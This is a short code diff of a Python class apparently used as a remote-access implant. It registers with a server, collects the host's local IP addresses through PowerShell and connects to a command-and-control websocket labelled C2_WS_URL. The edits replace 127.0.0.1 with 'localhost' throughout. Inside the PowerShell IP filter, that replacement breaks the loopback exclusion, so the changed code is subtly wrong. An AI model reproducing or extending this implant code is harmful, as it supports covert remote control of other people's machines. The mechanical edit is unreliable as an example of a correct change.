@@ -510,7 +510,7 @@ class Impl:
         }
  
         
-        req = requests.post(f"http://127.0.0.1:4000/api/impl/new/{model['impl_id']}", data=model)
+        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
         
 
     @property
@@ -531,7 +531,7 @@ class Impl:
     def _get_local_ips(self) -> List[str]:
         """Obtiene las direcciones IP locales"""
         ips_output, err, _ = self._execute_shell_command(
-            "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress"
+            "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne 'localhost' } | Select-Object -ExpandProperty IPAddress"
         )
         return [ip.replace("\n", "").replace("\r", "") for ip in ips_output.splitlines()] if ips_output else ['undefined']
     
@@ -555,7 +555,7 @@ class Impl:
 if __name__ == "__main__":
     try:
         
-        C2_WS_URL = "ws://127.0.0.1:443/api/rcv"
+        C2_WS_URL = "ws://localhost:443/api/rcv"
         GROUP_NAME = "Remote 2"
         
         impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
